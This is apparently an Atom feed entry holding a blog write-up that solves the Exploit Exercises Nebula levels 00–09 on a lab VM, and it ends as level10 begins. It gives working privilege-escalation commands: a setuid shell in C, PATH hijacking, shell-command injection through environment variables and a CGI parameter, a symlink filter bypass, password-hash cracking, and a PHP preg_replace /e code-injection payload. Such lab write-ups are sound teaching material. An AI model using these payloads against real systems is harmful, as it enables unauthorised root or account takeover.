<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: exploit | #!/slash/note]]></title>
  <link href="http://leonjza.github.io/blog/categories/exploit/atom.xml" rel="self"/>
  <link href="http://leonjza.github.io/"/>
  <updated>2015-05-28T19:47:58+02:00</updated>
  <id>http://leonjza.github.io/</id>
  <author>
    <name><![CDATA[Leon Jacobs]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[playing exploit-exercises - nebula]]></title>
    <link href="http://leonjza.github.io/blog/2015/05/09/playing-exploit-exercises-nebula/"/>
    <updated>2015-05-09T07:18:31+02:00</updated>
    <id>http://leonjza.github.io/blog/2015/05/09/playing-exploit-exercises-nebula</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p>Recently I decided I wanted to have a look at what <a href="https://exploit-exercises.com/">Exploit Exercises</a> had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for <a href="https://exploit-exercises.com/nebula/">Nebula</a>. <em>Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.</em></p>

<p><img class="<a" src="href="https://i.imgur.com/6K9zeta.jpg">https://i.imgur.com/6K9zeta.jpg</a>"></p>

<p>I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)</p>

<p>This is the path I took to solve the 20 challenges.</p>

<!-- more -->


<h2>setup</h2>

<p>On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.</p>

<p>After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:</p>

<p><code>bash
~ » ssh level00@192.168.217.239
no hostkey alg
</code></p>

<p><em>sigh</em>. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the <code>nebula</code> account to root and generated a RSA host key with: <code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code> with no password. I was now able to log in:</p>

<p>```text
~ » ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#108;&#101;&#x76;&#101;&#108;&#x30;&#x30;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#x31;&#55;&#x2e;&#50;&#51;&#57;">&#x6c;&#x65;&#x76;&#101;&#108;&#48;&#48;&#64;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x32;&#x31;&#55;&#x2e;&#50;&#x33;&#57;</a>
The authenticity of host &lsquo;192.168.217.239 (192.168.217.239)&rsquo; can&rsquo;t be established.
RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.217.239&rsquo; (RSA) to the list of known hosts.</p>

<pre><code>  _   __     __          __
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p><a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x6c;&#101;&#118;&#101;&#x6c;&#48;&#48;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x32;&#49;&#55;&#x2e;&#x32;&#51;&#x39;">&#x6c;&#101;&#x76;&#101;&#x6c;&#48;&#x30;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x32;&#x31;&#55;&#46;&#50;&#x33;&#57;</a>&rsquo;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>level00@nebula:~$
```</p>

<p>I could see that I was now logged in as level00</p>

<p><code>bash
level00@nebula:~$ id
uid=1001(level00) gid=1001(level00) groups=1001(level00)
</code></p>

<p>The challenges are all in their respective <code>flag</code> folder. So if you are logged in as <code>level00</code>, you are interested in <code>flag00</code>. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command <code>getflag</code> could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running <code>getflag</code> is enough to consider a level done. I had prepared a small C setuid shell in <code>/var/tmp/shell.c</code> with the following output:</p>

<p>```c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}
```
This shell was reused throughout the challenges. Lets dig into the challenges themselves.</p>

<h2>level00</h2>

<p><a href="https://exploit-exercises.com/nebula/level00/">Level00&rsquo;s Description</a>:
<blockquote><p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p></blockquote></p>

<p>Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know <em>about</em> SUID binaries :P</p>

<p>So, to solve level00:</p>

<p>```bash
level00@nebula:~$ find / -perm -4000 2> /dev/null | xargs ls -lh
-rwsr-x&mdash;&ndash; 1 flag00  level00    7.2K 2011-11-20 21:22 /bin/&hellip;/flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /bin/mount
-rwsr-xr-x 1 root    root        34K 2011-05-03 03:38 /bin/ping
-rwsr-xr-x 1 root    root        39K 2011-05-03 03:38 /bin/ping6
-rwsr-xr-x 1 root    root        31K 2011-06-24 02:37 /bin/su
-rwsr-xr-x 1 root    root        63K 2011-08-09 09:15 /bin/umount
-rwsr-x&mdash;&ndash; 1 flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/&hellip;/flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /rofs/bin/mount
[&hellip;]</p>

<p>level00@nebula:~$ /bin/&hellip;/flag00
Congrats, now run getflag to get your flag!</p>

<p>flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level01</h2>

<p><a href="https://exploit-exercises.com/nebula/level01/">Level01&rsquo;s Description</a>:
<blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level1.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  system(&ldquo;/usr/bin/env echo and now what?&rdquo;);
}
```</p>

<p>We can see a bunch of UID/GID stuff being set with with <code>setresgid</code> and <code>setresuid</code> and then a system command being run with <code>system()</code>. The problem lies in the fact that the command that is being run does not have a full path specified for the <code>echo</code> command. Even though its called with <code>/usr/bin/env</code>, it is possible to modify the current <code>PATH</code> variable and have <code>env</code> report echo as being somewhere other than where it would normally be.</p>

<p>On the filesystem we find the <code>flag01</code> binary and can see it is setuid for <code>flag01</code> user (we are currently logged in as <code>level01</code>):</p>

<p>```bash
level01@nebula:~$ cd ~flag01/
level01@nebula:/home/flag01$ ls -lh flag01
-rwsr-x&mdash;&ndash; 1 flag01 level01 7.2K 2011-11-20 21:22 flag01</p>

<p>level01@nebula:/home/flag01$ ./flag01
and now what?
```</p>

<p>Abusing this is really easy. I decided to create my own <code>echo</code> binary and modified <code>PATH</code> so that it is called instead of the real <code>echo</code>. A small note here though. The Nebula vm has <code>/tmp</code> mounted with the <code>nosuid</code> option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being <code>/var/tmp</code> was not mounted separately and I had write access there :)</p>

<p>```bash
level01@nebula:/home/flag01$ mount | grep &ldquo;/tmp&rdquo;
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)</p>

<p>level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp
drwxrwxrwt 3 root root   29 2012-08-23 18:46 tmp
```</p>

<p>So, to solve level01:</p>

<p>```bash
level01@nebula:/home/flag01$ cat /var/tmp/echo</p>

<h1>!/bin/sh</h1>

<p>gcc /var/tmp/shell.c -o /var/tmp/flag01
chmod 4777 /var/tmp/flag01</p>

<p>level01@nebula:/home/flag01$ ls -lh /var/tmp/echo
-rwxrwxr-x 1 level01 level01 77 2015-05-08 07:35 /var/tmp/echo</p>

<p>level01@nebula:/home/flag01$ cat /var/tmp/shell.c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>level01@nebula:/home/flag01$ export PATH=/var/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01
level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01
-rwsrwxrwx 1 flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01</p>

<p>level01@nebula:/home/flag01$ /var/tmp/flag01
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level02</h2>

<p><a href="https://exploit-exercises.com/nebula/level02/">Level02&rsquo;s Description</a>:
<blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level2.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char *buffer;</p>

<p>  gid_t gid;
  uid_t uid;</p>

<p>  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  buffer = NULL;</p>

<p>  asprintf(&amp;buffer, &ldquo;/bin/echo %s is cool&rdquo;, getenv(&ldquo;USER&rdquo;));
  printf(&ldquo;about to call system(\&rdquo;%s\&ldquo;)\n&rdquo;, buffer);</p>

<p>  system(buffer);
}
```</p>

<p>Level02 is very similar to Level01, except for that fact that here the line <code>/bin/echo %s is cool</code> is copied to <code>buffer</code> and eventually put through a <code>system()</code> call. The value of the current environment variable <code>USER</code> is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (<em>is cool</em> in this case).</p>

<p>So, to solve level02:</p>

<p>```bash
level02@nebula:/home/flag02$ ./flag02
about to call system(&ldquo;/bin/echo level02 is cool&rdquo;)
level02 is cool</p>

<p>level02@nebula:/home/flag02$ USER=&ldquo;bob&rdquo; &amp;&amp; ./flag02
about to call system(&ldquo;/bin/echo bob is cool&rdquo;)
bob is cool</p>

<p>level02@nebula:/home/flag02$ cat /var/tmp/shell.c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>level02@nebula:/home/flag02$ USER=&ldquo;bob; id;#&rdquo; &amp;&amp; ./flag02
about to call system(&ldquo;/bin/echo bob; id;# is cool&rdquo;)
bob
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)</p>

<p>level02@nebula:/home/flag02$ USER=&ldquo;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&rdquo; &amp;&amp; ./flag02
about to call system(&ldquo;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&rdquo;)
bob</p>

<p>level02@nebula:/home/flag02$ /var/tmp/flag02
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level03</h2>

<p><a href="https://exploit-exercises.com/nebula/level03/">Level03&rsquo;s Description</a>:
<blockquote><p>Check the home directory of flag03 and take note of the files there.<br/>There is a crontab that is called every couple of minutes.</p></blockquote></p>

<p>Logging in as <code>level03</code>, we find a directory and a <code>sh</code> script:</p>

<p>```bash
level03@nebula:~$ cd ~flag03
level03@nebula:/home/flag03$ ls -lh
total 512
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh</p>

<p>level03@nebula:/home/flag03$ cat writable.sh</p>

<h1>!/bin/sh</h1>

<p>for i in /home/flag03/writable.d/* ; do</p>

<pre><code>(ulimit -t 5; bash -x "$i")
rm -f "$i"
</code></pre>

<p>done
```</p>

<p>With the mention of a cronjob, I assumed the <code>writable.sh</code> script was being run. From the source of the script we can see that everything in <code>/home/flag03/writable.d/</code> will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using <code>bash -x</code>. Once done, the file is removed. Easy to exploit.</p>

<p>So, to solve level03:</p>

<p>```bash
level03@nebula:/home/flag03$ vim /var/tmp/flag03.sh
level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh</p>

<h1>!/bin/sh</h1>

<p>gcc /var/tmp/shell.c -o /var/tmp/flag03
chmod 4777 /var/tmp/flag03</p>

<p>level03@nebula:/home/flag03$ cat /var/tmp/shell.c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/</p>

<p>level03@nebula:/home/flag03$ # wait some time for the cronjob</p>

<p>level03@nebula:/home/flag03$ /var/tmp/flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level04</h2>

<p><a href="https://exploit-exercises.com/nebula/level04/">Level04&rsquo;s Description</a>:
<blockquote><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level4.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char buf[1024];
  int fd, rc;</p>

<p>  if(argc == 1) {</p>

<pre><code>  printf("%s [file to read]\n", argv[0]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  if(strstr(argv[1], &ldquo;token&rdquo;) != NULL) {</p>

<pre><code>  printf("You may not access '%s'\n", argv[1]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to open %s", argv[1]);
</code></pre>

<p>  }</p>

<p>  rc = read(fd, buf, sizeof(buf));</p>

<p>  if(rc == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to read fd %d", fd);
</code></pre>

<p>  }</p>

<p>  write(1, buf, rc);
}
```</p>

<p>From the snippet we can see that a check is in place for the first argument to see if the string <code>token</code> exists in it. As the token we want to read is actually called <em>token</em> this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.</p>

<p>So, to solve level04:</p>

<p>```bash
level04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04
level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04
06508b5e-8909-4f38-b630-fdb148a848a2</p>

<p>level04@nebula:/home/flag04$ su &ndash; flag04
Password:
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level05</h2>

<p><a href="https://exploit-exercises.com/nebula/level05/">Level05&rsquo;s Description</a>:
<blockquote><p>Check the flag05 home directory. You are looking for weak directory permissions</p></blockquote></p>

<p>Browsing to the <code>flag05</code> directory we can see a <code>.backup</code> directory containing a tar archive that is readable. This archive contained a private key that allowed login as the <code>flag05</code> user.</p>

<p>So, to solve level05:</p>

<p>```bash
level05@nebula:~$ cd ~flag05
level05@nebula:/home/flag05$ ls -lah
total 5.0K
drwxr-x&mdash;&ndash; 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     220 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r&mdash;r&mdash; 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r&mdash;r&mdash; 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
-rw-r&mdash;r&mdash; 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx&mdash;&mdash;&mdash; 2 flag05 flag05    70 2011-11-20 20:13 .ssh</p>

<p>level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -lah
total 2.0K
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x&mdash;&ndash; 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r&mdash; 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz</p>

<p>level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys</p>

<p>level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x66;&#x6c;&#97;&#103;&#48;&#x35;&#x40;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x66;&#x6c;&#97;&#x67;&#x30;&#53;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#46;&#48;&#46;&#49;</a>
The authenticity of host &lsquo;127.0.0.1 (127.0.0.1)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;127.0.0.1&rsquo; (ECDSA) to the list of known hosts.</p>

<p>[&hellip;]</p>

<p>flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level06</h2>

<p><a href="https://exploit-exercises.com/nebula/level05/">Level06&rsquo;s Description</a>:
<blockquote><p>The flag06 account credentials came from a legacy unix system.</p></blockquote></p>

<p>Legacy unix system? This immediately had me thinking that the password hash may be in <code>/etc/passwd</code>. Older unix systems used to store passwords this way, but that is no longer the case.</p>

<p><code>bash
level06@nebula:~$ cat /etc/passwd| grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</code></p>

<p>The hash <code>ueqwOCnSGdsuM</code> is something that I had to send to <code>john</code> to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P</p>

<p>```bash
~ # cat hash
ueqwOCnSGdsuM</p>

<p>~ # john hash
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello            (?)
guesses: 1  time: 0:00:00:00 DONE (Fri May  8 17:29:20 2015)  c/s: 102400  trying: 123456 &ndash; Pyramid
Use the &ldquo;&mdash;show&rdquo; option to display all of the cracked passwords reliably
```</p>

<p>The password is <code>hello</code>.
So, to solve level06:</p>

<p><code>bash
level06@nebula:~$ su - flag06
Password:
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level07</h2>

<p><a href="https://exploit-exercises.com/nebula/level07/">Level07&rsquo;s Description</a>:
<blockquote><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Perl program:</p>

<p>```perl index.cgi</p>

<h1>!/usr/bin/perl</h1>

<p>use CGI qw{param};</p>

<p>print &ldquo;Content-type: text/html\n\n&rdquo;;</p>

<p>sub ping {
  $host = $_[0];</p>

<p>  print(&ldquo;<html><head><title>Ping results</title></head><body><pre>&rdquo;);</p>

<p>  @output = <code>ping -c 3 $host 2&gt;&amp;1</code>;
  foreach $line (@output) { print &ldquo;$line&rdquo;; }</p>

<p>  print(&ldquo;</pre></body></html>&rdquo;);</p>

<p>}</p>

<h1>check if Host set. if not, display normal page, etc</h1>

<p>ping(param(&ldquo;Host&rdquo;));
```</p>

<p>This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the <code>flag07</code> directory one can see a <code>thttpd.conf</code> file which contains the port of the webserver serving this script on.</p>

<p>```bash
level07@nebula:/home/flag07$ grep port thttpd.conf</p>

<h1>Specifies an alternate port number to listen on.</h1>

<p>port=7007</p>

<h1>all hostnames supported on the local machine. See thttpd(8) for details.</h1>

<p>```</p>

<p>Exploiting the vulnerability simply meant that we have to inject commands into the <code>Host</code> parameter. I normally use python&rsquo;s urllib to ensure that fields are properly url encoded etc.</p>

<p>So, to solve level07:</p>

<p>```bash
~ » curl -v &ldquo;<a href="http://192.168.217.239:7007/index.cgi?$">http://192.168.217.239:7007/index.cgi?$</a>(python -c &lsquo;import urllib; print urllib.urlencode({ "Host&rdquo; : &ldquo;127.0.0.1 &amp;&amp; gcc /var/tmp/shell.c -o /var/tmp/flag07 &amp;&amp; chmod 4777 /var/tmp/flag07&rdquo; })&rsquo;)&ldquo;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239&hellip;
* Connected to 192.168.217.239 (192.168.217.239) port 7007 (#0)</p>

<blockquote><p>GET /index.cgi?Host=127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
User-Agent: curl/7.37.1
Host: 192.168.217.239:7007
Accept: <em>/</em></p>

<ul>
<li>HTTP 1.0, assume close after body
&lt; HTTP/1.0 200 OK
&lt; Content-type: text/html
&lt;
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.022 ms</li>
</ul>
</blockquote>

<p>&mdash;&ndash; 127.0.0.1 ping statistics &mdash;&ndash;
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.011/0.018/0.023/0.007 ms
* Closing connection 0
</pre></body></html>
```</p>

<p>And finally back on the NebulaVM after this curl from my host:</p>

<p><code>bash
level07@nebula:/home/flag07$ /var/tmp/flag07
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level08</h2>

<p><a href="https://exploit-exercises.com/nebula/level08/">Level08&rsquo;s Description</a>:
<blockquote><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p></blockquote></p>

<p>Logging in as the user <code>level08</code> reveals a pcap in the <code>flag08</code> directory:</p>

<p>```bash
level08@nebula:~$ cd ~flag08
level08@nebula:/home/flag08$ ls
capture.pcap</p>

<p>level08@nebula:/home/flag08$ file capture.pcap
capture.pcap: tcpdump capture file (little-endian) &ndash; version 2.4 (Ethernet, capture length 65535)
```</p>

<p>I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:</p>

<p><img class="<a" src="href="https://i.imgur.com/Xc6IIbX.png">https://i.imgur.com/Xc6IIbX.png</a>"></p>

<p>Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the <code>level8</code> account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.</p>

<p><img class="<a" src="href="https://i.imgur.com/CWAERLv.png">https://i.imgur.com/CWAERLv.png</a>"></p>

<p><code>F7</code> according to the ASCII table is a backspace. That makes this easy :) Considering we have the password <code>backdoor...00Rm8.ate</code>, substituting the dot with backspaces we end up with <code>backd00Rmate</code> as the password.</p>

<p>So, to solve level08:</p>

<p>```bash
level08@nebula:/home/flag08$ su &ndash; flag08
Password:</p>

<p>flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level09</h2>

<p><a href="https://exploit-exercises.com/nebula/level09/">Level09&rsquo;s Description</a>:
<blockquote><p>There’s a C setuid wrapper for some vulnerable PHP code…</p></blockquote></p>

<p>With the description we are provided with the source code of a small PHP program:</p>

<p>```php level9.php
&lt;?php</p>

<p>function spam($email)
{
  $email = preg_replace(&ldquo;/./&rdquo;, &ldquo; dot &rdquo;, $email);
  $email = preg_replace(&ldquo;/@/&rdquo;, &ldquo; AT &rdquo;, $email);</p>

<p>  return $email;
}</p>

<p>function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);</p>

<p>  $contents = preg_replace(&ldquo;/([email (.*)])/e&rdquo;, &ldquo;spam(\&rdquo;\2\&ldquo;)&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/[/&rdquo;, &ldquo;&lt;&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/]/&rdquo;, &ldquo;>&rdquo;, $contents);</p>

<p>  return $contents;
}</p>

<p>$output = markup($argv[1], $argv[2]);</p>

<p>print $output;</p>

<p>?>
```</p>

<p>In the <code>flag09</code> directory, we have the above PHP sample as well as a SUID binary.</p>

<p><code>bash
level09@nebula:~$ cd ~flag09
level09@nebula:/home/flag09$ ls -lh
total 8.0K
-rwsr-x--- 1 flag09 level09 7.1K 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
</code></p>

<p>At first I managed to solve this one really fast. When <code>flag09</code> is invoked with <code>-h</code>, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:</p>

<p>```bash
level09@nebula:/home/flag09$ ./flag09 -a
Interactive shell</p>

<p>php > system(&ldquo;id&rdquo;);
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
```</p>

<p>With this I would have been able to prepare the small <code>flag09</code> setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.</p>

<p>The PHP code basically had 2 main functions. <code>markup()</code> and <code>spam()</code>. <code>markup()</code> would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching <code>[email addr]</code> where <em>addr</em> will be the extracted part. It then as a callback executes <code>spam()</code> which will convert <code>.</code> to <code>dot</code> and <code>@</code> to <code>AT</code>. I took a really long time researching the <code>preg_replace()</code> functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when <code>preg_replace()</code> is called with the <code>e</code> modifier. <a href="http://www.madirish.net/402">This</a> blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">here</a> helps develop a payload for exploitation. The PHP documentation has a sample of <code>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</code> which is what I used to finish the final payload for this level.</p>

<p>Another thing to note about the PHP code is the <code>$use_me</code> variable passed to the <code>markup()</code> function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)</p>

<p>So, to solve level09:</p>

<p>```bash
level09@nebula:/home/flag09$ echo -ne &ldquo;[email {\${system(\$use_me)}}]&rdquo; > /var/tmp/flag09.txt</p>

<p>level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt
[email {${system($use_me)}}]</p>

<p>level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt &ldquo;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&rdquo;
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1</p>

<p>level09@nebula:/home/flag09$ /var/tmp/flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>intermission</h3>

<p>From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)</p>

<p>I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
Lets get to them!</p>

<h2>level10</h2>

<p><a href="https://exploit-exercises.com/nebula/level10/">Level10&rsquo;s Description</a>:
<blockquote><p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p></blockquote></p>

<p>With the description we are provided with the source code of a small PHP program:</p>

<p>```c basic.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

